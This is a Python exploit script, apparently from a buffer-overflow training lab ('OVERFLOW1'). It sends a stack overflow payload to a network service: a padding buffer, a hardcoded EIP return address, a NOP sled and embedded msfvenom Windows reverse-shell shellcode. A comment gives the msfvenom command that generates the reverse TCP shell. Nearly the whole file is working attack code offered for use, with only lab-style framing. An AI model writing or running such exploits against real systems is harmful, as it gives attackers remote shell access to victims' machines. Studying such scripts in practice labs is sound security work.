#!/usr/bin/env python3

import socket, time, sys


# Generate a shellcode using the command: msfvenom -p windows/shell_reverse_tcp LHOST=YOUR_IP LPORT=4444 EXITFUNC=thread -b "\x00" -f c
ip = "10.10.48.81"

port = 1337
timeout = 5
prefix = "OVERFLOW1 "


eip = '\xAF\x11\x50\x62'


offset = 1978


shellcode = ("\xbf\xd0\xf0\xa4\xe1\xdb\xc5\xd9\x74\x24\xf4\x5b\x33\xc9"
"\xb1\x52\x31\x7b\x12\x03\x7b\x12\x83\x13\xf4\x46\x14\x6f"
"\x1d\x04\xd7\x8f\xde\x69\x51\x6a\xef\xa9\x05\xff\x40\x1a"
"\x4d\xad\x6c\xd1\x03\x45\xe6\x97\x8b\x6a\x4f\x1d\xea\x45"
"\x50\x0e\xce\xc4\xd2\x4d\x03\x26\xea\x9d\x56\x27\x2b\xc3"
"\x9b\x75\xe4\x8f\x0e\x69\x81\xda\x92\x02\xd9\xcb\x92\xf7"
"\xaa\xea\xb3\xa6\xa1\xb4\x13\x49\x65\xcd\x1d\x51\x6a\xe8"
"\xd4\xea\x58\x86\xe6\x3a\x91\x67\x44\x03\x1d\x9a\x94\x44"
"\x9a\x45\xe3\xbc\xd8\xf8\xf4\x7b\xa2\x26\x70\x9f\x04\xac"
"\x22\x7b\xb4\x61\xb4\x08\xba\xce\xb2\x56\xdf\xd1\x17\xed"
"\xdb\x5a\x96\x21\x6a\x18\xbd\xe5\x36\xfa\xdc\xbc\x92\xad"
"\xe1\xde\x7c\x11\x44\x95\x91\x46\xf5\xf4\xfd\xab\x34\x06"
"\xfe\xa3\x4f\x75\xcc\x6c\xe4\x11\x7c\xe4\x22\xe6\x83\xdf"
"\x93\x78\x7a\xe0\xe3\x51\xb9\xb4\xb3\xc9\x68\xb5\x5f\x09"
"\x94\x60\xcf\x59\x3a\xdb\xb0\x09\xfa\x8b\x58\x43\xf5\xf4"
"\x79\x6c\xdf\x9c\x10\x97\x88\xa8\xee\x25\x18\xc5\xec\x49"
"\x88\x49\x78\xaf\xc0\x61\x2c\x78\x7d\x1b\x75\xf2\x1c\xe4"
"\xa3\x7f\x1e\x6e\x40\x80\xd1\x87\x2d\x92\x86\x67\x78\xc8"
"\x01\x77\x56\x64\xcd\xea\x3d\x74\x98\x16\xea\x23\xcd\xe9"
"\xe3\xa1\xe3\x50\x5a\xd7\xf9\x05\xa5\x53\x26\xf6\x28\x5a"
"\xab\x42\x0f\x4c\x75\x4a\x0b\x38\x29\x1d\xc5\x96\x8f\xf7"
"\xa7\x40\x46\xab\x61\x04\x1f\x87\xb1\x52\x20\xc2\x47\xba"
"\x91\xbb\x11\xc5\x1e\x2c\x96\xbe\x42\xcc\x59\x15\xc7\xec"
"\xbb\xbf\x32\x85\x65\x2a\xff\xc8\x95\x81\x3c\xf5\x15\x23"
"\xbd\x02\x05\x46\xb8\x4f\x81\xbb\xb0\xc0\x64\xbb\x67\xe0"
"\xac")
string = prefix + "A" * offset + eip +"\x90" * 16 + shellcode

while True:
  try:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
      s.settimeout(timeout)
      s.connect((ip, port))
      s.recv(1024)
      print("Sending evil buffer of {} bytes".format(len(string) - len(prefix)))
      s.send(bytes(string, "latin-1"))
      s.recv(1024)
  except:
    print("Fuzzing crashed at {} bytes".format(len(string) - len(prefix)))
    sys.exit(0)
  string += 100 * "A"
  time.sleep(1)



